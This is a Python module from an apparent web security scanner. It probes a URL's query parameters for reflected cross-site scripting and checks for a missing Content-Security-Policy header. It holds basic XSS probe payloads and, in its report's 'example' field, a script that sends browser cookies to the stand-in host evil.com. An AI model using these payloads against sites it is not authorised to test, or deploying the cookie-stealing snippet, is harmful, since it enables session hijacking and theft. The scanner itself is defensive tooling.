"""XSS Scanner — fast version with connect/read split timeouts."""

import requests

XSS_PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
TEST_PARAMS   = ["q", "search", "input", "s"]   # reduced from 8


def _get(url, timeout):
    return requests.get(url, timeout=(2, timeout), allow_redirects=True,
                        headers={"User-Agent":"SecuritySentinel/3.0"})


def check(url: str, timeout: int = 4) -> dict:
    affected_urls = []

    for param in TEST_PARAMS:
        for payload in XSS_PAYLOADS:
            test_url = f"{url}?{param}={requests.utils.quote(payload)}"
            try:
                resp = _get(test_url, timeout)
                if payload in resp.text:
                    affected_urls.append(test_url)
                    break
            except Exception:
                pass

    csp_missing = False
    try:
        resp = _get(url, timeout)
        csp_missing = "content-security-policy" not in {k.lower() for k in resp.headers}
    except Exception:
        pass

    found = bool(affected_urls) or csp_missing
    parts = []
    if affected_urls:
        parts.append("Reflected XSS detected — user input returned unescaped in HTML.")
    if csp_missing:
        parts.append("Content-Security-Policy (CSP) header missing.")

    return {
        "id":"XSS-001", "name":"Cross-Site Scripting (XSS)",
        "severity":"critical" if affected_urls else ("medium" if csp_missing else "info"),
        "description":" ".join(parts) if parts else "No XSS indicators found.",
        "affected_urls":affected_urls,
        "businessImpact":"Attackers can hijack customer sessions and steal payment details.",
        "tech":"User-supplied input returned in HTML without sanitization.",
        "example":"<script>document.location=\n  'https://evil.com/steal?c='\n  +document.cookie\n</script>",
        "fix":"Sanitize all user input; add DOMPurify; set CSP header.",
        "effort":"1 day for a developer",
        "recommendation":"1. Escape all output (use DOMPurify).\n2. Add CSP: default-src 'self'.\n3. Validate all input server-side.",
        "found":found,
    }